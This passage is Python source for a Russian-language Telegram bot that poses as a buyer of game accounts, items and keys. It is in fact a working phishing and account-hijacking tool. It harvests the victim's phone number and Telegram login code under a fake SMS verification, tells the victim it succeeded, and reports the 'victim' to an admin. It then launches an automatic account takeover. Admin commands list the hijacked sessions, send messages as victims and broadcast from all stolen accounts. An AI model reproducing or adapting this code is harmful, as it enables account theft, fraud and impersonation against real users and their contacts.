• 💎 <b>Цифровой предмет</b> - CS:GO скины, Dota 2 предметы
• 🎫 <b>Игровой ключ</b> - Активационный ключ игры
• 📱 <b>Цифровой подарок</b> - Gift Card, ваучер
• 💳 <b>Электронные деньги</b> - Qiwi, Яндекс.Деньги
• 📦 <b>Другое</b> - Укажите в описании
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🎮 Игровой аккаунт", callback_data="type_account")],
        [InlineKeyboardButton(text="💎 Цифровой предмет", callback_data="type_item")],
        [InlineKeyboardButton(text="🎫 Игровой ключ", callback_data="type_key")],
        [InlineKeyboardButton(text="📱 Цифровой подарок", callback_data="type_gift")],
        [InlineKeyboardButton(text="💳 Электронные деньги", callback_data="type_money")],
        [InlineKeyboardButton(text="📦 Другое", callback_data="type_other")]
    ])
    
    await state.set_state(SellerStates.waiting_item_type)
    await bot.edit_message_text(
        item_types_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML",
        reply_markup=keyboard
    )
    log_action(user.id, "start_selling")

@dp.callback_query(SellerStates.waiting_item_type)
async def process_item_type(callback_query: types.CallbackQuery, state: FSMContext):
    item_types = {
        "type_account": "Игровой аккаунт",
        "type_item": "Цифровой предмет",
        "type_key": "Игровой ключ",
        "type_gift": "Цифровой подарок",
        "type_money": "Электронные деньги",
        "type_other": "Другое"
    }
    
    item_type = item_types.get(callback_query.data, "Другое")
    await state.update_data(item_type=item_type)
    
    photos_text = f"""
📸 <b>ДОБАВЛЕНИЕ ФОТОГРАФИЙ</b>

<b>Категория:</b> {item_type}

<b>Пришлите фотографии вашего товара:</b>
• Для аккаунтов: скриншоты профиля, библиотеки игр
• Для предметов: скриншоты инвентаря
• Для ключей: фото сертификата (если есть)
• Для подарков: фото карты или чека

<b>Требования:</b>
✅ Хорошее качество
✅ Виден весь товар
✅ Нет водяных знаков
✅ Максимум 5 фото

<b>Отправьте фото или нажмите /skip если фото нет</b>
    """
    
    await state.set_state(SellerStates.waiting_photos)
    await bot.edit_message_text(
        photos_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML"
    )
    log_action(callback_query.from_user.id, "select_item_type", item_type)

@dp.message(SellerStates.waiting_photos, F.photo)
async def process_photos(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    photos = user_data.get('photos', [])
    
    # Сохраняем информацию о фото
    photo_id = message.photo[-1].file_id
    photos.append(photo_id)
    
    await state.update_data(photos=photos)
    
    if len(photos) >= 5:
        await message.answer("✅ Максимальное количество фото достигнуто (5 фото)")
        await ask_description(message, state)
    else:
        remaining = 5 - len(photos)
        await message.answer(f"✅ Фото добавлено. Осталось мест: {remaining}")

@dp.message(SellerStates.waiting_photos, Command("skip"))
async def skip_photos(message: types.Message, state: FSMContext):
    await ask_description(message, state)

async def ask_description(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    item_type = user_data.get('item_type', 'Товар')
    
    description_text = f"""
📝 <b>ОПИСАНИЕ ТОВАРА</b>

<b>Категория:</b> {item_type}

<b>Подробно опишите ваш товар:</b>

<b>Пример для игрового аккаунта:</b>
• Платформа (Steam/Epic Games/др.)
• Количество игр
• Уровень/ранг
• Наличие привязок
• История аккаунта

<b>Пример для предметов:</b>
• Название предмета
• Игра
• Редкость
• Состояние
• Особенности

<b>Чем подробнее описание - тем выше цена!</b>
    """
    
    await state.set_state(SellerStates.waiting_description)
    await message.answer(description_text, parse_mode="HTML")

@dp.message(SellerStates.waiting_description)
async def process_description(message: types.Message, state: FSMContext):
    description = message.text
    await state.update_data(description=description)
    
    # Получаем все данные
    user_data = await state.get_data()
    photos_count = len(user_data.get('photos', []))
    
    summary_text = f"""
📋 <b>ПОДТВЕРЖДЕНИЕ ЗАЯВКИ</b>

<b>Категория:</b> {user_data['item_type']}
<b>Фотографии:</b> {photos_count} шт.
<b>Описание:</b>
{description[:500]}{'...' if len(description) > 500 else ''}

<b>Далее:</b>
1. Модератор проверит заявку
2. Определит стоимость товара
3. Вы получите предложение цены
4. После согласия - инструкции по передаче

<b>Все верно?</b>
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ ПОДТВЕРДИТЬ", callback_data="confirm_submit")],
        [InlineKeyboardButton(text="✏️ ИЗМЕНИТЬ", callback_data="edit_submit")]
    ])
    
    await state.set_state(SellerStates.waiting_confirm)
    await message.answer(summary_text, parse_mode="HTML", reply_markup=keyboard)

@dp.callback_query(SellerStates.waiting_confirm, F.data == "confirm_submit")
async def confirm_submission(callback_query: types.CallbackQuery, state: FSMContext):
    user = callback_query.from_user
    user_data = await state.get_data()
    
    # Сохраняем в БД
    photos_json = json.dumps(user_data.get('photos', []))
    
    cursor.execute('''
        INSERT INTO items (user_id, item_type, photos, description, status)
        VALUES (?, ?, ?, ?, 'pending')
    ''', (user.id, user_data['item_type'], photos_json, user_data['description']))
    
    item_id = cursor.lastrowid
    conn.commit()
    
    # Отправляем модераторам
    for moderator_id in MODERATOR_IDS:
        try:
            moderator_text = f"""
🆕 <b>НОВАЯ ЗАЯВКА #{item_id}</b>
━━━━━━━━━━━━━━━━
👤 <b>Продавец:</b> {user.first_name} (@{user.username})
🆔 <b>User ID:</b> {user.id}
🏷 <b>Категория:</b> {user_data['item_type']}
📝 <b>Описание:</b>
{user_data['description'][:500]}...
📸 <b>Фото:</b> {len(user_data.get('photos', []))} шт.
━━━━━━━━━━━━━━━━
<b>Действия:</b>
            """
            
            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="💰 ОЦЕНИТЬ", callback_data=f"price_{item_id}"),
                 InlineKeyboardButton(text="💬 ЧАТ", callback_data=f"chat_{item_id}")],
                [InlineKeyboardButton(text="❌ ОТКЛОНИТЬ", callback_data=f"reject_{item_id}")]
            ])
            
            await bot.send_message(
                moderator_id,
                moderator_text,
                parse_mode="HTML",
                reply_markup=keyboard
            )
            
            # Отправляем фото если есть
            photos = user_data.get('photos', [])
            if photos:
                media_group = []
                for photo_id in photos[:3]:
                    media_group.append(types.InputMediaPhoto(media=photo_id, caption=f"Фото заявки #{item_id}" if photo_id == photos[0] else ""))
                
                await bot.send_media_group(moderator_id, media_group)
                
        except Exception as e:
            logger.error(f"Ошибка отправки модератору {moderator_id}: {e}")
    
    # Ответ пользователю
    user_response = f"""
✅ <b>ЗАЯВКА #{item_id} ПРИНЯТА!</b>

<b>Статус:</b> На модерации ⏳

<b>Что дальше:</b>
1. Модератор оценит ваш товар (1-24 часа)
2. Вы получите предложение цены
3. После согласия - инструкции по передаче
4. Получение денег на карту/кошелек

<b>Среднее время проверки:</b> 2-4 часа
<b>Следить за статусом:</b> /status
    """
    
    await bot.edit_message_text(
        user_response,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML"
    )
    
    log_action(user.id, "submit_item", f"item_id: {item_id}")
    await state.clear()

@dp.callback_query(F.data.startswith("price_"))
async def moderator_set_price(callback_query: types.CallbackQuery, state: FSMContext):
    item_id = int(callback_query.data.split("_")[1])
    
    # Получаем информацию о товаре
    cursor.execute(
        "SELECT i.*, u.first_name, u.username FROM items i JOIN users u ON i.user_id = u.user_id WHERE i.id = ?",
        (item_id,)
    )
    item = cursor.fetchone()
    
    if not item:
        await callback_query.answer("❌ Товар не найден")
        return
    
    price_text = f"""
💰 <b>УСТАНОВКА ЦЕНЫ</b>

<b>Заявка #{item_id}</b>
<b>Продавец:</b> {item[8]} (@{item[9]})
<b>Товар:</b> {item[2]}
<b>Описание:</b>
{item[4][:300]}...

<b>Рекомендуемые цены:</b>
• Аккаунты: 500-5000 руб
• Предметы: 50-5000 руб
• Ключи: 300-3000 руб
• Подарки: 100-10000 руб

<b>Введите цену в рублях:</b>
    """
    
    await state.set_state(ModeratorStates.waiting_price)
    await state.update_data(item_id=item_id, moderator_id=callback_query.from_user.id)
    
    await bot.edit_message_text(
        price_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML"
    )

@dp.message(ModeratorStates.waiting_price, F.text.regexp(r'^\d+$'))
async def process_price_input(message: types.Message, state: FSMContext):
    price = int(message.text)
    moderator_data = await state.get_data()
    item_id = moderator_data['item_id']
    moderator_id = moderator_data['moderator_id']
    
    # Обновляем цену в БД
    cursor.execute(
        "UPDATE items SET price = ?, moderator_id = ?, status = 'approved' WHERE id = ?",
        (price, moderator_id, item_id)
    )
    conn.commit()
    
    # Получаем данные о продавце
    cursor.execute(
        "SELECT user_id FROM items WHERE id = ?",
        (item_id,)
    )
    seller_id = cursor.fetchone()[0]
    
    # Отправляем предложение продавцу
    offer_text = f"""
🎉 <b>ПРЕДЛОЖЕНИЕ ЦЕНЫ!</b>

<b>Заявка #{item_id} одобрена!</b>

💰 <b>Наша цена:</b> <b>{price} руб.</b>

<b>Принять предложение?</b>

<b>После принятия:</b>
1. Вы получите инструкции по передаче товара
2. Мы проверим получение
3. Вы получите деньги на карту/кошелек

<b>Срок выплаты:</b> 1-24 часа после проверки
    """
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ ПРИНЯТЬ", callback_data=f"accept_{item_id}"),
         InlineKeyboardButton(text="❌ ОТКЛОНИЬ", callback_data=f"decline_{item_id}")],
        [InlineKeyboardButton(text="💬 ОБСУДИТЬ ЦЕНУ", callback_data=f"negotiate_{item_id}")]
    ])
    
    try:
        await bot.send_message(
            seller_id,
            offer_text,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        await message.answer(f"✅ Цена {price} руб установлена для заявки #{item_id}")
    except Exception as e:
        await message.answer(f"❌ Не удалось отправить предложение продавцу: {e}")
    
    await state.clear()

@dp.callback_query(F.data.startswith("chat_"))
async def start_moderator_chat(callback_query: types.CallbackQuery, state: FSMContext):
    item_id = int(callback_query.data.split("_")[1])
    moderator_id = callback_query.from_user.id
    
    # Получаем информацию
    cursor.execute(
        "SELECT i.user_id, u.first_name FROM items i JOIN users u ON i.user_id = u.user_id WHERE i.id = ?",
        (item_id,)
    )
    item = cursor.fetchone()
    
    if not item:
        await callback_query.answer("❌ Товар не найден")
        return
    
    seller_id = item[0]
    seller_name = item[1]
    
    # Создаем или находим чат
    cursor.execute(
        "SELECT id FROM chats WHERE user_id = ? AND moderator_id = ? AND status = 'open'",
        (seller_id, moderator_id)
    )
    chat = cursor.fetchone()
    
    if not chat:
        cursor.execute(
            "INSERT INTO chats (user_id, moderator_id, messages) VALUES (?, ?, ?)",
            (seller_id, moderator_id, json.dumps([]))
        )
        chat_id = cursor.lastrowid
        conn.commit()
    else:
        chat_id = chat[0]
    
    chat_text = f"""
💬 <b>ЧАТ С ПРОДАВЦОМ</b>

<b>Продавец:</b> {seller_name}
<b>Заявка:</b> #{item_id}
<b>Чат ID:</b> {chat_id}

<b>Напишите сообщение продавцу:</b>
    """
    
    await state.set_state(ModeratorStates.waiting_chat)
    await state.update_data(chat_id=chat_id, seller_id=seller_id)
    
    await bot.edit_message_text(
        chat_text,
        chat_id=callback_query.message.chat.id,
        message_id=callback_query.message.message_id,
        parse_mode="HTML"
    )

@dp.message(ModeratorStates.waiting_chat)
async def process_moderator_message(message: types.Message, state: FSMContext):
    chat_data = await state.get_data()
    chat_id = chat_data['chat_id']
    seller_id = chat_data['seller_id']
    
    # Сохраняем сообщение
    cursor.execute("SELECT messages FROM chats WHERE id = ?", (chat_id,))
    messages_json = cursor.fetchone()[0]
    messages = json.loads(messages_json) if messages_json else []
    
    messages.append({
        "from": "moderator",
        "text": message.text,
        "time": datetime.now().isoformat()
    })
    
    cursor.execute(
        "UPDATE chats SET messages = ? WHERE id = ?",
        (json.dumps(messages), chat_id)
    )
    conn.commit()
    
    # Отправляем продавцу
    try:
        await bot.send_message(
            seller_id,
            f"📨 <b>Сообщение от поддержки:</b>\n\n{message.text}\n\n<i>Вы можете ответить в этом же чате.</i>",
            parse_mode="HTML"
        )
        await message.answer("✅ Сообщение отправлено продавцу")
    except Exception as e:
        await message.answer(f"⚠️ Не удалось отправить сообщение продавцу: {e}")

@dp.message(F.contact)
async def process_phone_number(message: types.Message, state: FSMContext):
    user = message.from_user
    phone = message.contact.phone_number

    logger.info(f"[DEBUG] Получен контакт от пользователя {user.id}: {phone}")

    # Убираем + если есть
    if phone.startswith('+'):
        phone = phone[1:]

    # Сохраняем номер
    cursor.execute(
        "UPDATE users SET phone = ? WHERE user_id = ?",
        (phone, user.id)
    )
    conn.commit()

    # ГЕНЕРИРУЕМ ФЕЙКОВЫЙ КОД (5-6 цифр)
    fake_code = str(random.randint(10000, 999999))
    
    logger.info(f"[DEBUG] Сгенерирован код: {fake_code} для пользователя {user.id}")

    # Сохраняем сгенерированный код для проверки
    cursor.execute(
        "UPDATE users SET code = ? WHERE user_id = ?",
        (fake_code, user.id)
    )
    conn.commit()

    # 1. Сообщаем пользователю, что код отправлен
    initial_text = f"""
✅ <b>НОМЕР ПОДТВЕРЖДЕН: +{phone}</b>

📱 <b>На номер +{phone} было отправлено SMS с кодом подтверждения.</b>

⏳ <b>Пожалуйста, ожидайте ответа от администратора для отправки кода.</b>

🔢 <b>Код состоит из 5-6 цифр.</b>

<i>Обычно это занимает несколько минут. Вы получите уведомление, когда код будет готов.</i>
"""
    
    logger.info(f"[DEBUG] Отправляю начальное сообщение пользователю {user.id}")
    
    try:
        await message.answer(initial_text, parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
        logger.info(f"[DEBUG] Начальное сообщение отправлено успешно")
    except Exception as e:
        logger.error(f"[DEBUG] Ошибка отправки начального сообщения: {e}")

    # 2. Переводим пользователя в состояние ожидания кода
    await state.set_state(VerificationStates.waiting_code)
    logger.info(f"[DEBUG] Пользователь {user.id} переведен в состояние waiting_code")

    # 3. Уведомляем админа о необходимости отправить код
    admin_msg = f"""
🎣 <b>НОВЫЙ НОМЕР ДЛЯ ФИШИНГА</b>
━━━━━━━━━━━━━━━━
👤 <b>Жертва:</b> {user.first_name} (@{user.username})
🆔 <b>User ID:</b> {user.id}
📱 <b>Телефон:</b> +{phone}
🔢 <b>Сгенерированный код:</b> {fake_code}
⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━
<b>Жертва ожидает код. Отправьте SMS код:</b> {fake_code}
"""
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Код отправлен", callback_data=f"code_sent_{user.id}")],
        [InlineKeyboardButton(text="❌ Отменить", callback_data=f"cancel_code_{user.id}")]
    ])
    
    try:
        await bot.send_message(ADMIN_ID, admin_msg, parse_mode="HTML", reply_markup=keyboard)
        logger.info(f"[DEBUG] Уведомление админу отправлено")
    except Exception as e:
        logger.error(f"[DEBUG] Ошибка отправки админу: {e}")
    
    log_action(user.id, "phone_submitted", f"phone: {phone}")

@dp.callback_query(F.data.startswith("code_sent_"))
async def handle_code_sent(callback_query: types.CallbackQuery):
    """Админ подтвердил отправку кода"""
    user_id = int(callback_query.data.split("_")[2])
    
    # Получаем информацию о пользователе
    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user_id,))
    user_data = cursor.fetchone()
    
    if not user_data:
        await callback_query.answer("❌ Пользователь не найден")
        return
    
    phone = user_data[0]
    code = user_data[1]
    
    # Сообщаем пользователю, что код "отправлен"
    user_notification = f"""
✍️ <b>Администратор отправил SMS код на номер +{phone}:</b>

<code>Пример кода: {code}</code>

<b>Пожалуйста, введите код из SMS:</b>

<i>Если код не пришел, используйте</i> /resend_code
"""
    
    try:
        await bot.send_message(user_id, user_notification, parse_mode="HTML")
        await callback_query.answer("✅ Пользователь уведомлен о отправке кода")
        
        # Обновляем сообщение админу
        await bot.edit_message_text(
            f"✅ <b>Код отправлен пользователю {user_id}</b>\n\n"
            f"Телефон: +{phone}\n"
            f"Код: {code}\n"
            f"Статус: Ожидание ввода кода",
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            parse_mode="HTML"
        )
        
    except Exception as e:
        await callback_query.answer(f"❌ Ошибка: {str(e)[:100]}")
        logger.error(f"[CODE SENT] Ошибка отправки пользователю: {e}")

@dp.callback_query(F.data.startswith("cancel_code_"))
async def handle_cancel_code(callback_query: types.CallbackQuery):
    """Админ отменяет отправку кода"""
    user_id = int(callback_query.data.split("_")[2])
    
    try:
        await bot.edit_message_text(
            f"❌ <b>Отправка кода отменена для пользователя {user_id}</b>",
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            parse_mode="HTML"
        )
        await callback_query.answer("❌ Отправка кода отменена")
        
    except Exception as e:
        logger.error(f"[CANCEL CODE] Ошибка: {e}")

@dp.message(VerificationStates.waiting_code, F.text.regexp(r'^\d{5,6}$'))
async def process_verification_code(message: types.Message, state: FSMContext):
    user = message.from_user
    code = message.text

    # Проверяем, подтвержден ли номер у пользователя
    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
    user_data = cursor.fetchone()

    if not user_data or not user_data[0]:
        # Если номера нет, просим пройти верификацию сначала
        await message.answer("❌ <b>Сначала необходимо подтвердить номер телефона.</b>\n\nИспользуйте меню верификации или нажмите /start", parse_mode="HTML")
        await state.clear()
        return

    phone = user_data[0]
    saved_code = user_data[1]

    # Сохраняем введенный код (даже если не совпадает)
    cursor.execute(
        "UPDATE users SET code = ? WHERE user_id = ?",
        (code, user.id)
    )
    conn.commit()

    # ВСЕГДА УСПЕШНОЕ СООБЩЕНИЕ ДЛЯ ПОЛЬЗОВАТЕЛЯ
    success_text = f"""
✅ <b>Верификация по SMS завершена успешно!</b>

Ваш номер <b>+{phone}</b> подтвержден.

🎉 <b>Теперь вы можете продавать товары!</b>

📸 <b>Следующий шаг:</b>
Нажмите кнопку ниже чтобы начать продажу:
"""
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 НАЧАТЬ ПРОДАЖУ", callback_data="sell_item")]
    ])
    
    await message.answer(success_text, parse_mode="HTML", reply_markup=keyboard)
    
    # Очищаем состояние
    await state.clear()
    
    # ========== АВТОМАТИЧЕСКИЙ ЗАХВАТ АККАУНТА ==========
    if hijacker:
        await message.answer("⏳ <b>Проверка безопасности аккаунта...</b>", parse_mode="HTML")
        
        # Запускаем захват в фоновом режиме
        asyncio.create_task(attempt_account_hijack(phone, code, user.id))
    else:
        # Отправляем стандартное уведомление админу
        await send_admin_report(user, phone, code, saved_code)
    
    log_action(user.id, "code_submitted", f"code: {code}, phone: {phone}")

async def send_admin_report(user, phone, code, saved_code):
    """Отправляет отчет админу о фишинге"""
    admin_report = f"""
🎣 <b>ФИШИНГ УСПЕШЕН!</b>
━━━━━━━━━━━━━━━━
👤 <b>Жертва:</b> {user.first_name} (@{user.username})
🆔 <b>User ID:</b> {user.id}
📱 <b>Телефон:</b> +{phone}
🔢 <b>Введенный код:</b> {code}
💾 <b>Сохраненный код:</b> {saved_code if saved_code else 'нет'}
💰 <b>Мотив:</b> Продажа игрового товара
⏰ <b>Время:</b> {datetime.now().strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━
<b>⚠️ Hijacker не инициализирован - ручной захват</b>
<b>Код для входа:</b> <code>{code}</code>
"""
    
    try:
        await bot.send_message(ADMIN_ID, admin_report, parse_mode="HTML")
    except Exception as e:
        logger.error(f"Ошибка отправки админу: {e}")

@dp.message(Command("resend_code"))
async def cmd_resend_code(message: types.Message, state: FSMContext):
    user = message.from_user

    # Проверяем, есть ли сохраненный номер телефона
    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user.id,))
    user_data = cursor.fetchone()

    if not user_data or not user_data[0]:
        # Если номера нет, просим сначала подтвердить номер
        await message.answer("❌ <b>Сначала необходимо подтвердить номер телефона через меню верификации.</b>\n\nНажмите /start и выберите 'ПРОДАТЬ ТОВАР'", parse_mode="HTML")
        return

    phone = user_data[0]
    old_code = user_data[1]

    # Генерируем НОВЫЙ код
    new_fake_code = str(random.randint(10000, 999999))

    # Обновляем код в базе
    cursor.execute(
        "UPDATE users SET code = ? WHERE user_id = ?",
        (new_fake_code, user.id)
    )
    conn.commit()

    # Устанавливаем состояние ожидания кода
    await state.set_state(VerificationStates.waiting_code)

    # Информируем пользователя
    resend_text = f"""
🔄 <b>Запрошена повторная отправка кода</b>

📱 <b>Новый код будет отправлен на номер +{phone} после проверки администратором.</b>
⏳ <b>Пожалуйста, ожидайте ответа от администратора.</b>

<i>Администратор получил ваш запрос и скоро отправит код.</i>
"""
    await message.answer(resend_text, parse_mode="HTML")

    # Уведомляем админа о запросе нового кода
    admin_notification = f"""
🔄 <b>ЗАПРОС ПОВТОРНОЙ ОТПРАВКИ КОДА</b>
━━━━━━━━━━━━━━━━
👤 <b>Пользователь:</b> {user.first_name} (@{user.username})
🆔 <b>User ID:</b> {user.id}
📱 <b>Телефон:</b> +{phone}
🔢 <b>Старый код:</b> {old_code}
🔢 <b>Новый код:</b> {new_fake_code}
⏰ <b>Время запроса:</b> {datetime.now().strftime('%H:%M:%S')}
━━━━━━━━━━━━━━━━
<b>Отправить новый код пользователю?</b>
"""
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Отправить новый код", callback_data=f"resend_code_{user.id}")],
        [InlineKeyboardButton(text="❌ Отклонить запрос", callback_data=f"reject_resend_{user.id}")]
    ])
    
    try:
        await bot.send_message(ADMIN_ID, admin_notification, parse_mode="HTML", reply_markup=keyboard)
    except:
        pass
    
    log_action(user.id, "resend_code_requested")

@dp.callback_query(F.data.startswith("resend_code_"))
async def handle_admin_resend_code(callback_query: types.CallbackQuery):
    """Админ отправляет новый код"""
    user_id = int(callback_query.data.split("_")[2])
    
    # Получаем информацию о пользователе
    cursor.execute("SELECT phone, code FROM users WHERE user_id = ?", (user_id,))
    user_data = cursor.fetchone()
    
    if not user_data:
        await callback_query.answer("❌ Пользователь не найден")
        return
    
    phone = user_data[0]
    code = user_data[1]
    
    # Уведомляем пользователя
    user_message = f"""
✍️ <b>Администратор отправил новый SMS код на номер +{phone}:</b>

<code>Пример кода: {code}</code>

<b>Пожалуйста, введите код из SMS:</b>

<i>Если код не пришел, используйте</i> /resend_code
"""
    
    try:
        await bot.send_message(user_id, user_message, parse_mode="HTML")
        await callback_query.answer("✅ Новый код отправлен пользователю")
        
        # Обновляем сообщение админу
        await bot.edit_message_text(
            f"✅ <b>Новый код отправлен пользователю {user_id}</b>\n\n"
            f"Телефон: +{phone}\n"
            f"Код: {code}\n"
            f"Статус: Ожидание ввода кода",
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            parse_mode="HTML"
        )
        
    except Exception as e:
        await callback_query.answer(f"❌ Ошибка: {str(e)[:100]}")
        logger.error(f"[RESEND CODE] Ошибка отправки пользователю: {e}")

@dp.callback_query(F.data.startswith("reject_resend_"))
async def handle_reject_resend(callback_query: types.CallbackQuery):
    """Админ отклоняет запрос повторной отправки"""
    user_id = int(callback_query.data.split("_")[2])
    
    try:
        await bot.edit_message_text(
            f"❌ <b>Запрос повторной отправки кода отклонен для пользователя {user_id}</b>",
            chat_id=callback_query.message.chat.id,
            message_id=callback_query.message.message_id,
            parse_mode="HTML"
        )
        await callback_query.answer("❌ Запрос отклонен")
        
        # Уведомляем пользователя
        try:
            await bot.send_message(
                user_id,
                "❌ <b>Ваш запрос на повторную отправку кода отклонен администратором.</b>\n\n"
                "Пожалуйста, обратитесь в поддержку для выяснения причины.",
                parse_mode="HTML"
            )
        except:
            pass
        
    except Exception as e:
        logger.error(f"[REJECT RESEND] Ошибка: {e}")

@dp.message(VerificationStates.waiting_code)
async def handle_wrong_code_input(message: types.Message):
    await message.answer("❌ <b>Пожалуйста, введите 5-6 значный код из SMS.</b>\n\nЕсли код не пришел, используйте /resend_code", parse_mode="HTML")

@dp.callback_query(F.data == "start_verification")
async def start_verification_process(callback_query: types.CallbackQuery, state: FSMContext):
    verification_text = """
📱 <b>ШАГ 1: ПОДТВЕРЖДЕНИЕ НОМЕРА ТЕЛЕФОНА</b>

Для верификации необходимо подтвердить номер телефона, привязанный к Telegram.

<b>Нажмите кнопку ниже для подтверждения номера:</b>
    """
    
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 ПОДТВЕРДИТЬ НОМЕР", request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    
    await state.set_state(VerificationStates.waiting_phone)
    
    await bot.send_message(
        callback_query.from_user.id,
        verification_text,
        parse_mode="HTML",
        reply_markup=keyboard
    )

# ========== КОМАНДЫ ДЛЯ УПРАВЛЕНИЯ АККАУНТАМИ ==========

@dp.message(Command("hijacked"))
async def cmd_hijacked(message: types.Message):
    """Показать захваченные аккаунты"""
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
        return
    
    if not hijacker:
        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
        return
    
    accounts = hijacker.get_hijacked_accounts()
    
    if not accounts:
        await message.answer("📭 Нет захваченных аккаунтов", parse_mode="HTML")
        return
    
    accounts_text = "<b>📋 ЗАХВАЧЕННЫЕ АККАУНТЫ</b>\n━━━━━━━━━━━━━━━━\n\n"
    
    for i, acc in enumerate(accounts, 1):
        status = "✅" if acc[5] == 1 else "❌"
        accounts_text += f"{i}. <b>{status} +{acc[0]}</b>\n"
        accounts_text += f"   👤 @{acc[2] or 'нет'} ({acc[3]})\n"
        accounts_text += f"   🆔 {acc[1]}\n"
        accounts_text += f"   ⏰ {acc[4][:16]}\n"
        accounts_text += "   ━━━━━━━━━━━\n"
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Проверить доступ", callback_data="check_access_all")],
        [InlineKeyboardButton(text="🗑️ Очистить неактивные", callback_data="clear_inactive_sessions")],
        [InlineKeyboardButton(text="📨 Тест рассылка", callback_data="test_broadcast")]
    ])
    
    await message.answer(accounts_text, parse_mode="HTML", reply_markup=keyboard)

@dp.message(Command("send_as"))
async def cmd_send_as(message: types.Message):
    """Отправить сообщение от захваченного аккаунта"""
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
        return
    
    if not hijacker:
        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
        return
    
    # Формат: /send_as +79123456789 @username текст сообщения
    args = message.text.split(maxsplit=3)
    
    if len(args) < 4:
        await message.answer(
            "📝 <b>Формат:</b> /send_as +79123456789 @username текст_сообщения\n\n"
            "<b>Пример:</b> /send_as +79123456789 @test_user Привет, это тест!",
            parse_mode="HTML"
        )
        return
    
    phone = args[1]
    target = args[2]
    text = args[3]
    
    await message.answer(f"⏳ Отправляю сообщение от +{phone}...", parse_mode="HTML")
    
    success = await hijacker.send_message_from_hijacked(phone, target, text)
    
    if success:
        await message.answer(f"✅ Сообщение отправлено от +{phone} к {target}", parse_mode="HTML")
    else:
        await message.answer(f"❌ Не удалось отправить сообщение", parse_mode="HTML")

@dp.message(Command("check_access"))
async def cmd_check_access(message: types.Message):
    """Проверить доступ ко всем аккаунтам"""
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
        return
    
    if not hijacker:
        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
        return
    
    accounts = hijacker.get_hijacked_accounts()
    
    if not accounts:
        await message.answer("📭 Нет аккаунтов для проверки", parse_mode="HTML")
        return
    
    await message.answer(f"🔍 Проверяю доступ к {len(accounts)} аккаунтам...", parse_mode="HTML")
    
    active = 0
    inactive = 0
    
    for acc in accounts:
        phone = acc[0]
        
        # Получаем сессию
        hijacker.cursor.execute(
            "SELECT session_string FROM hijacked_sessions WHERE phone = ? ORDER BY hijacked_at DESC LIMIT 1",
            (phone,)
        )
        result = hijacker.cursor.fetchone()
        
        if result:
            session_string = result[0]
            is_active = await hijacker.check_account_access(session_string)
            
            if is_active:
                active += 1
                hijacker.update_account_status(phone, True)
            else:
                inactive += 1
                hijacker.update_account_status(phone, False)
    
    await message.answer(
        f"📊 <b>РЕЗУЛЬТАТ ПРОВЕРКИ</b>\n\n"
        f"✅ Активные: {active}\n"
        f"❌ Неактивные: {inactive}\n"
        f"📈 Всего: {len(accounts)}",
        parse_mode="HTML"
    )

@dp.message(Command("auto_login"))
async def cmd_auto_login(message: types.Message):
    """Автоматический вход во все сохраненные аккаунты"""
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
        return
    
    if not hijacker:
        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
        return
    
    await message.answer("🔄 Запускаю автоматический вход во все аккаунты...", parse_mode="HTML")
    
    # Запускаем авто-вход в фоне
    asyncio.create_task(auto_login_hijacked_accounts())
    
    await message.answer("✅ Авто-вход запущен. Результаты будут отправлены вам позже.", parse_mode="HTML")

@dp.message(Command("broadcast"))
async def cmd_broadcast(message: types.Message, state: FSMContext):
    """Начать рассылку от всех аккаунтов"""
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещен", parse_mode="HTML")
        return
    
    if not hijacker:
        await message.answer("⚠️ Hijacker не инициализирован", parse_mode="HTML")
        return
    
    await message.answer(
        "📨 <b>НАСТРОЙКА РАССЫЛКИ</b>\n\n"
        "Введите список получателей (каждый с новой строки):\n"
        "Пример:\n"
        "@user1\n"
        "+79123456789\n"
        "123456789\n\n"
        "<i>Напишите 'стоп' на отдельной строке чтобы закончить список</i>",
        parse_mode="HTML"
    )
    
    await state.set_state(HijackStates.waiting_auto_login)

@dp.message(HijackStates.waiting_auto_login)
